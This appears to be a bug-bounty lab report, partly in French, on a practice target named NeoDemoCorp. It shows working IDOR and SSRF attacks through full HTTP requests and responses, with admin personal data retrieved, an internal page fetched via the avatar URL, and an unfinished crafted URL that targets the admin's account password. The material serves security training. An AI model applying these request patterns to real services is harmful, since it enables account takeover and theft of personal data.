# YesWeHAck - NeoDemoCorp reports

# IDOR

* On login, there is a request to get user's informations : 

```
GET /users/getinfo/1248/?fields[]=email&fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
```

```
{"email":"banane@patate.fr","role":"user"}
```

* We can change user's ID 1248 => 1 to get admin's informations

```
GET /users/getinfo/1/?fields[]=email&fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
```

```
{"email":"joe@neodemo.corp","role":"admin"}
```

* Then, we can add parameters to the request to get more inforamtions

```
GET /users/getinfo/1/?fields[]=email&fields[]=role&fields[]=address&fields[]=zipcode&fields[]=phone HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
```

```
{"email":"joe@neodemo.corp","role":"admin","address":"2884 Elian Extension\nRolfsonfort, IN 38630-6178","zipcode":"63883-16","phone":"485.580.4012"}
```

# SSRF
## Objectif
* Faire executer au serveur distant des requêtes non voulues
=> Potentielemnt atteindre des pages non authorisées

## Pré-requis
* Être inscrit 
* Burp suite

## Identitication 

* Lors de l'édition d'édition du profile, nous pouvons y insérer une url d'une image pour l'avatar.
* Nous pouvons nous en servir pour accéder à d'autres pages internes
* Dans le champ __Avatar Url__, entrer l'url voulu : 

```
https://localhost/users/add
```

* Dans burp nous voyons passer la requête

```
POST /users/edit/1341 HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15; -BB-NeoDemoCorp
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 183
Origin: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/users/edit/1341
Cookie: csrfToken=XXXXXXXXXX; CAKEPHP=XXXXXXXXXX
Upgrade-Insecure-Requests: 1

_method=PUT&_csrfToken=XXXXXXX&email=bob%40eponge.fr&avatar_url=https%3A%2F%2Flocalhost%2Fusers%2Fadd&address=ananas+au+fond+de+la+mer&zipcode=12345&city=mediteran%C3%A9e&phone=123456789&agent_number=1&password=
```

* Nous pouvons obtenir la page voulu dans les informations utilisateurs

```
GET /users/getinfo/1341/?fields[]=email&fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15; -BB-NeoDemoCorp
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXX; CAKEPHP=XXXXXXXXXX
```

* Ajoutons des paramètres

```
GET /users/getinfo/1341/?fields[]=email&fields[]=role&fields[]=avatar&fields[]=phone&fields[]=address HTTP/1.1
```

```
{"email":"bob@eponge.fr","role":"user","avatar":"PCFET0NUWVBFIGh0bWw+Cgo8aHRtbCBsYW5nPSIiIGNsYXNzPSJuby1qcyI+CiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEsbWluaW11bS1zY2FsZT0xIj4KCiAgICAgICAgPHRpdGxlPlVzZXJzPC90aXRsZT4KCiAgICAgICAgPGxpbmsgaHJlZj0iL2Zhdmljb24uaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIHJlbD0iaWNvbiIvPjxsaW5rIGhyZWY9Ii9mYXZpY29uLmljbyIgdHlwZT0iaW1hZ2UveC1pY29uIiByZWw9InNob3J0Y3V0IGljb24iLz48bWV0YSBuYW1lPSJhdXRob3IiLz4gICAgICAgIAoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvY3NzL2N1c3RvbS5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvcmVkMS5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvY29tcG9uZW50cy5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvcGx1Z2lucy5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvYm9vdHN0cmFwL2Jvb3RzdHJhcC5taW4uY3NzIi8+CgogICAgPCEtLSBIVE1MNSBzaGltIGFuZCBSZXNwb25kLmpzIGZvciBJRTggc3VwcG9ydCBvZiBIVE1MNSBlbGVtZW50cyBhbmQgbWVkaWEgcXVlcmllcyAtLT4KICAgIDwhLS1baWYgbHQgSUUgOV0+CiAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL29zcy5tYXhjZG4uY29tL2h0bWw1c2hpdi8zLjcuMi9odG1sNXNoaXYubWluLmpzIj48L3NjcmlwdD4KICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vb3NzLm1heGNkbi5jb20vcmVzcG9uZC8xLjQuMi9yZXNwb25kLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8IVtlbmRpZl0tLT4gICAgICAgIAoJPHNjcmlwdCBzcmM9Ii9qcy9qcXVlcnkvanF1ZXJ5LmpzIj48L3NjcmlwdD4KCTxzY3JpcHQgc3JjPSIvanMvYm9vdHN0cmFwL2Jvb3RzdHJhcC5qcyI+PC9zY3JpcHQ+CiAgICA8L2hlYWQ+CgogICAgPGJvZHkgY2xhc3M9IlVzZXJzIGFkZCIgPjxoZWFkZXIgY2xhc3M9ImMtbGF5b3V0LWhlYWRlciBjLWxheW91dC1oZWFkZXItNiI+CiAgICA8ZGl2IGNsYXNzPSJjLW5hdmJhciI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYy1uYXZiYXItd3JhcHBlciBjbGVhcmZpeCI+CiAgICAgICAgICAgICAgICA8bmF2IGNsYXNzPSJjLW1lZ2EtbWVudSBjLXB1bGwtcmlnaHQgYy1tZWdhLW1lbnUtZGFyayBjLW1lZ2EtbWVudS1kYXJrLW1vYmlsZSBjLXRoZW1lIGMtZm9udHMtdXBwZXJjYXNlIGMtZm9udHMtYm9sZCI+CiAgICAgICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXYgbmF2YmFyLW5hdiBjLXRoZW1lLW5hdiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImMtbWVudS10eXBlLWNsYXNzaWMiPjxhIGNsYXNzPSJjLWxvZ28iIGhyZWY9Ii8iPjxpbWcgc3JjPSIvaW1nL2xvZ28ucG5nIiBjbGFzcz0ibG9nbyIgc3R5bGU9ImhlaWdodDogMzdweDsiIGFsdD0iTmVvRGVtb0NvcnAiPjwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJjLW1lbnUtdHlwZS1jbGFzc2ljIj48YSBocmVmPSIvYXJ0aWNsZXMiIGNsYXNzPSJjLWxpbmsiIHRpdGxlPSJBbGwgb2ZmZXJzIj5BbGwgb2ZmZXJzPC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0iYy1tZW51LXR5cGUtY2xhc3NpYyI+PGEgaHJlZj0iL3VzZXJzL2xvZ2luIj48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBjLWJ0biBjLXRoZW1lLWJ0biBjLWJ0bi11cHBlcmNhc2UgYy1idG4tYm9sZCI+IFNpZ24gaW4gPC9idXR0b24+PC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImMtbWVudS10eXBlLWNsYXNzaWMiPjxhIGhyZWY9Ii91c2Vycy9hZGQiPjxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGMtYnRuIGMtdGhlbWUtYnRuIGMtYnRuLXVwcGVyY2FzZSBjLWJ0bi1ib2xkIj4gTm90IHJlZ2lzdGVyZWQgeWV0PyA8L2J1dHRvbj48L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPC9uYXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvaGVhZGVyPgoKCgo8ZGl2IGNsYXNzPSJqdW1ib3Ryb24iPgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+QWRkIHVzZXI8L2gxPgogICAgPC9kaXY+CjwvZGl2PgoKPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCgogICAgPGRpdiBjbGFzcz0idXNlcnMgZm9ybSBsYXJnZS05IG1lZGl1bS04IGNvbHVtbnMgY29udGVudCI+CiAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBhY2NlcHQtY2hhcnNldD0idXRmLTgiIGlkPSJhZGR1c2VyIiBjbGFzcz0iZm9ybS1ob3Jpem9udGFsIiByb2xlPSJmb3JtIiBhY3Rpb249Ii91c2Vycy9hZGQiPjxkaXYgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Il9tZXRob2QiIHZhbHVlPSJQT1NUIi8+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iX2NzcmZUb2tlbiIgYXV0b2NvbXBsZXRlPSJvZmYiIHZhbHVlPSIyNzhjNmFlMGI5MGY2ZmM2NzJmZWQ2ZDdiYzlmNWQzZjNkNGU0Zjc5OGYyNDNlNWJhNDZhYWNhMjYyYjQzYzI4MzEwMGZiNzU1YzQ3ZjY5MDBmNjI2ZWQxYTcwYjVkOTUwYTMwNzNmMTYwOTU0NTYxOTgyZGFiN2IzZWI3ZGM2YiIvPjwvZGl2PiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGVtYWlsIHJlcXVpcmVkIj48bGFiZWwgY2xhc3M9ImNvbnRyb2wtbGFiZWwiIGZvcj0iZW1haWxhZGQiPkVtYWlsIChtYW5kYXRvcnkpPC9sYWJlbD48aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9ImVtYWlsIiBpZD0iZW1haWxhZGQiIHJlcXVpcmVkPSJyZXF1aXJlZCIgbWF4bGVuZ3RoPSIyNTUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiLz48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHRleHQiPjxsYWJlbCBjbGFzcz0iY29udHJvbC1sYWJlbCIgZm9yPSJhZGRyZXNzYWRkIj5BZGRyZXNzPC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYWRkcmVzcyIgaWQ9ImFkZHJlc3NhZGQiIG1heGxlbmd0aD0iMjU1IiBjbGFzcz0iZm9ybS1jb250cm9sIi8+PC9kaXY+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCB0ZXh0Ij48bGFiZWwgY2xhc3M9ImNvbnRyb2wtbGFiZWwiIGZvcj0iemlwY29kZWFkZCI+WmlwY29kZTwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9InppcGNvZGUiIGlkPSJ6aXBjb2RlYWRkIiBtYXhsZW5ndGg9IjgiIGNsYXNzPSJmb3JtLWNvbnRyb2wiLz48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHRleHQiPjxsYWJlbCBjbGFzcz0iY29udHJvbC1sYWJlbCIgZm9yPSJjaXR5YWRkIj5DaXR5PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY2l0eSIgaWQ9ImNpdHlhZGQiIG1heGxlbmd0aD0iNTAiIGNsYXNzPSJmb3JtLWNvbnRyb2wiLz48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHRlbCI+PGxhYmVsIGNsYXNzPSJjb250cm9sLWxhYmVsIiBmb3I9InBob25lYWRkIj5QaG9uZTwvbGFiZWw+PGlucHV0IHR5cGU9InRlbCIgbmFtZT0icGhvbmUiIGlkPSJwaG9uZWFkZCIgbWF4bGVuZ3RoPSIxMiIgY2xhc3M9ImZvcm0tY29udHJvbCIvPjwvZGl2PjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgdGV4dCI+PGxhYmVsIGNsYXNzPSJjb250cm9sLWxhYmVsIiBmb3I9ImFnZW50bnVtYmVyYWRkIj5BZ2VudCBOdW1iZXI8L2xhYmVsPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJhZ2VudF9udW1iZXIiIGlkPSJhZ2VudG51bWJlcmFkZCIgbWF4bGVuZ3RoPSI1IiBjbGFzcz0iZm9ybS1jb250cm9sIi8+PC9kaXY+ICAgICAgICAgICAgPGhyPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHBhc3N3b3JkIHJlcXVpcmVkIj48bGFiZWwgY2xhc3M9ImNvbnRyb2wtbGFiZWwiIGZvcj0icGFzc3dvcmRhZGQiPlBhc3N3b3JkIChtYW5kYXRvcnkpPC9sYWJlbD48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmRhZGQiIHJlcXVpcmVkPSJyZXF1aXJlZCIgY2xhc3M9ImZvcm0tY29udHJvbCIvPjwvZGl2PiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcGFzc3dvcmQyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY29udHJvbC1sYWJlbCIgZm9yPSJwYXNzd29yZGFkZDIiPkNvbmZpcm0gUGFzc3dvcmQgKG1hbmRhdG9yeSk8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmRhZGQyIiByZXF1aXJlZD0icmVxdWlyZWQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGJ1dHRvbiBpZD0iY3JlYXRlYnV0dG9uIiBkaXNhYmxlZD0iZGlzYWJsZWQiIGNsYXNzPSJjLWFjdGlvbi1idG4gYnRuIGJ0bi1tZCBjLWJ0bi1zcXVhcmUgYy1idG4tYm9yZGVyLTJ4IGMtYnRuLWJsYWNrIGMtYnRuLWJvbGQgYy1idG4tdXBwZXJjYXNlIGJ0bi1kZWZhdWx0IiB0eXBlPSJzdWJtaXQiPkNyZWF0ZTwvYnV0dG9uPiAgICAgICAgPC9maWVsZHNldD4KICAgICAgICA8L2Zvcm0+ICAgIDwvZGl2PgoKPC9kaXY+Cjxicj48YnI+PGJyPjxicj48YnI+CjxzY3JpcHQ+CiAgICBmdW5jdGlvbiBjaGVja3Bhc3MoKSB7CiAgICAgICAgaWYoJCgnI3Bhc3N3b3JkYWRkJykudmFsKCkgIT0gJycgJiYgJCgnI3Bhc3N3b3JkYWRkJykudmFsKCkgPT0gJCgnI3Bhc3N3b3JkYWRkMicpLnZhbCgpKSB7ICQoJyNjcmVhdGVidXR0b24nKS5yZW1vdmVBdHRyKCdkaXNhYmxlZCcpOyB9IGVsc2UgeyAkKCcjY3JlYXRlYnV0dG9uJykucHJvcCgnZGlzYWJsZWQnLCB0cnVlKTsgIH0KICAgIH0KICAgICQoJyNwYXNzd29yZGFkZCcpLm9uKCdrZXl1cCBwYXN0ZScsZnVuY3Rpb24oKXsgY2hlY2twYXNzKCk7IH0pOwogICAgJCgnI3Bhc3N3b3JkYWRkMicpLm9uKCdrZXl1cCBwYXN0ZScsZnVuY3Rpb24oKXsgY2hlY2twYXNzKCk7IH0pOwo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cgo8IS0tIFNlcnZlZCBieTogMTcyLjE5LjAuMiAtLT4K","phone":"123456789","address":"ananas au fond de la mer"}
```

* Nous obtenons en base64 la code source la page passée en url d'avatar.

```
<!DOCTYPE html>

<html lang="" class="no-js">
    <head>
        <meta charset="utf-8"/>        <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">

        <title>Users</title>

        <link href="/favicon.ico" type="image/x-icon" rel="icon"/><link href="/favicon.ico" type="image/x-icon" rel="shortcut icon"/><meta name="author"/>        
	<link rel="stylesheet" href="/css/custom.css"/>

	<link rel="stylesheet" href="/css/red1.css"/>

	<link rel="stylesheet" href="/css/components.css"/>

	<link rel="stylesheet" href="/css/plugins.css"/>

	<link rel="stylesheet" href="/css/bootstrap/bootstrap.min.css"/>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->        
	<script src="/js/jquery/jquery.js"></script>
	<script src="/js/bootstrap/bootstrap.js"></script>
    </head>

    <body class="Users add" ><header class="c-layout-header c-layout-header-6">
    <div class="c-navbar">
        <div class="container">
            <div class="c-navbar-wrapper clearfix">
                <nav class="c-mega-menu c-pull-right c-mega-menu-dark c-mega-menu-dark-mobile c-theme c-fonts-uppercase c-fonts-bold">
                    <ul class="nav navbar-nav c-theme-nav">
                            <li class="c-menu-type-classic"><a class="c-logo" href="/"><img src="/img/logo.png" class="logo" style="height: 37px;" alt="NeoDemoCorp"></a></li>
                            <li class="c-menu-type-classic"><a href="/articles" class="c-link" title="All offers">All offers</a></li>
                        
                        
                            <li class="c-menu-type-classic"><a href="/users/login"><button type="button" class="btn c-btn c-theme-btn c-btn-uppercase c-btn-bold"> Sign in </button></a></li>
                            <li class="c-menu-type-classic"><a href="/users/add"><button type="button" class="btn c-btn c-theme-btn c-btn-uppercase c-btn-bold"> Not registered yet? </button></a></li>
                                            </ul>
                </nav>
            </div>
        </div>
    </div>
</header>



<div class="jumbotron">
    <div class="container">
        <h1>Add user</h1>
    </div>
</div>

<div class="container">


    <div class="users form large-9 medium-8 columns content">
        <form method="post" accept-charset="utf-8" id="adduser" class="form-horizontal" role="form" action="/users/add"><div style="display:none;"><input type="hidden" name="_method" value="POST"/><input type="hidden" name="_csrfToken" autocomplete="off" value="278c6ae0b90f6fc672fed6d7bc9f5d3f3d4e4f798f243e5ba46aaca262b43c283100fb755c47f6900f626ed1a70b5d950a3073f160954561982dab7b3eb7dc6b"/></div>        <fieldset>
            <div class="form-group email required"><label class="control-label" for="emailadd">Email (mandatory)</label><input type="email" name="email" id="emailadd" required="required" maxlength="255" class="form-control"/></div><div class="form-group text"><label class="control-label" for="addressadd">Address</label><input type="text" name="address" id="addressadd" maxlength="255" class="form-control"/></div><div class="form-group text"><label class="control-label" for="zipcodeadd">Zipcode</label><input type="text" name="zipcode" id="zipcodeadd" maxlength="8" class="form-control"/></div><div class="form-group text"><label class="control-label" for="cityadd">City</label><input type="text" name="city" id="cityadd" maxlength="50" class="form-control"/></div><div class="form-group tel"><label class="control-label" for="phoneadd">Phone</label><input type="tel" name="phone" id="phoneadd" maxlength="12" class="form-control"/></div><div class="form-group text"><label class="control-label" for="agentnumberadd">Agent Number</label><input type="text" name="agent_number" id="agentnumberadd" maxlength="5" class="form-control"/></div>            <hr>
            <div class="form-group password required"><label class="control-label" for="passwordadd">Password (mandatory)</label><input type="password" name="password" id="passwordadd" required="required" class="form-control"/></div>            <div class="form-group password2">
                <label class="control-label" for="passwordadd2">Confirm Password (mandatory)</label>
                <input type="password" id="passwordadd2" required="required" class="form-control">
            </div>
            <button id="createbutton" disabled="disabled" class="c-action-btn btn btn-md c-btn-square c-btn-border-2x c-btn-black c-btn-bold c-btn-uppercase btn-default" type="submit">Create</button>        </fieldset>
        </form>    </div>

</div>
<br><br><br><br><br>
<script>
    function checkpass() {
        if($('#passwordadd').val() != '' && $('#passwordadd').val() == $('#passwordadd2').val()) { $('#createbutton').removeAttr('disabled'); } else { $('#createbutton').prop('disabled', true);  }
    }
    $('#passwordadd').on('keyup paste',function(){ checkpass(); });
    $('#passwordadd2').on('keyup paste',function(){ checkpass(); });
</script>
</body>
</html>

<!-- Served by: 172.19.0.2 -->
¦'{]·ã»ó
```

## Exploitation



ESSAI DE PAWNER LE CSRF TOKEN DE JOE ADMIN ! 
A LA FIN DE L'URL

https%3A%2F%2Flocalhost%2Fusers%2Fedit%2F1%3Femail=joe%40neodemo.corp&avatar_url=&address=ananas+au+fond+de+la+mer&zipcode=12345&city=mediteran%C3%A9e&phone=123456789&agent_number=1&password=banane